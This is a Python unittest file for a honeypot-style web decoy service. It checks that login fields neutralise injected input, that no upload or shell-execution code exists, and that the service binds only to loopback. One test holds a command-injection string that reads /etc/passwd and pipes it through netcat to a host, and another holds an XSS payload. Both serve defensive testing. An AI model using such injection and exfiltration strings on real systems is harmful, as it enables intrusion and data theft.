"""Security and boundary invariance tests for SnareSight Web Decoy."""

import unittest
from fastapi.testclient import TestClient
from pydantic import ValidationError
from app.main import app
from app.config import DecoySettings, settings


class TestDecoySecurity(unittest.TestCase):
    """Verifies security controls, inert payload handling, and network binding invariants."""

    def setUp(self):
        self.client = TestClient(app)

    def test_12_script_like_input_remains_inert(self):
        """TEST 12: XSS payloads submitted in fields are HTML-escaped and remain inert text."""
        xss_payload = '<script>alert("PWNED")</script>'
        response = self.client.post("/login", data={"username": xss_payload, "password": "123"})
        self.assertEqual(response.status_code, 401)
        # Raw unescaped <script> tag must not appear in the response
        self.assertNotIn("<script>alert", response.text)

    def test_13_command_like_strings_remain_inert(self):
        """TEST 13: Command injection payloads are treated as plain text without execution."""
        cmd_payload = "admin; cat /etc/passwd | nc 192.168.1.1 9000"
        response = self.client.post("/login", data={"username": cmd_payload, "password": "123"})
        self.assertEqual(response.status_code, 401)
        self.assertNotIn("root:", response.text)

    def test_14_no_file_upload_endpoints_exist(self):
        """TEST 14: Confirms no file upload routes exist on the decoy service."""
        routes = [route.path for route in app.routes if hasattr(route, "path")]
        self.assertNotIn("/upload", routes)
        self.assertNotIn("/api/upload", routes)
        self.assertNotIn("/files", routes)

    def test_15_no_shell_execution_primitives(self):
        """TEST 15: Confirms no subprocess or shell execution calls exist in the app module."""
        import inspect
        import app.routes.login as login_module
        source = inspect.getsource(login_module)
        self.assertNotIn("os.system", source)
        self.assertNotIn("subprocess", source)
        self.assertNotIn("exec(", source)
        self.assertNotIn("eval(", source)

    def test_17_health_endpoint_does_not_leak_secrets(self):
        """TEST 17: GET /health returns operational state without leaking keys or paths."""
        response = self.client.get("/health")
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data["status"], "healthy")
        self.assertIn("decoy_id", data)
        self.assertNotIn("salt", str(data).lower())
        self.assertNotIn("key", str(data).lower())
        self.assertNotIn("path", str(data).lower())
        self.assertNotIn("password", str(data).lower())

    def test_18_offline_development_mode_binds_to_loopback(self):
        """TEST 18: Default configuration binds strictly to 127.0.0.1."""
        self.assertEqual(settings.BIND_HOST, "127.0.0.1")

    def test_19_service_refuses_unsafe_wildcard_binding(self):
        """TEST 19: DecoySettings validation strictly raises ValueError on 0.0.0.0 or ::."""
        with self.assertRaises(ValidationError):
            DecoySettings(BIND_HOST="0.0.0.0")

        with self.assertRaises(ValidationError):
            DecoySettings(BIND_HOST="::")

    def test_20_decoy_does_not_connect_to_postgresql(self):
        """TEST 20: Verifies no database ORM or direct DB drivers are imported in the decoy."""
        import sys
        self.assertNotIn("sqlalchemy", sys.modules.get("app.main", {}).__dict__ if hasattr(sys.modules.get("app.main"), "__dict__") else [])
        self.assertNotIn("psycopg2", sys.modules)


if __name__ == "__main__":
    unittest.main()
